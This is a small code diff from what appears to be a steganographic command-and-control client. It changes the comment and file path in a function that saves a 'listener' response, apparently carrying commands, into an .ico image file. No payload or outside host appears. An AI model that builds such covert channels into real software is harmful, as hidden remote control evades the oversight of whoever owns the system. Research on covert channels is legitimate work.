@@ -150,8 +150,8 @@ def send_stego_data_to_listener(data: str):
 
 
 def get_command_line_input(response: Response):
-    # for now, listener reply is simply stored in the response text TODO: store and retrieve it via image steganoraphy
-    secret = "secret_web/secret2.ico"
+    # TODO: request image from server
+    secret = "/secret_web/secret2.ico"
     #data = response.read()
     with open(secret, "wb") as f:
         f.write(response.content)
